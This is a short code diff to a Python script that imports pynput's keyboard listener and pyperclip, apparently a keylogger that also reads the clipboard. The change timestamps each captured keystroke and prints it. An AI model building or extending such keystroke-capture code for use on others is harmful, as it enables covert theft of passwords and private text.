@@ -1,5 +1,6 @@
 import os
 import time
+from datetime import datetime 
 from pynput import keyboard
 import pyperclip
 from threading import Thread
@@ -26,10 +27,12 @@ def returnKeyType(key):
     return keyPressed
 
 def parseOutput(keyPressed):
-    keyPressed = keyPressed + "\n"
+    keyPressed = keyPressed
+    currTime = datetime.now()
+    currTimeString = currTime.strftime("%H:%M:%S %d-%m-%Y")
+    keyPressed = keyPressed + "     " + currTimeString + "\n"
+    print(keyPressed)
     return keyPressed
-
-
 
 
 
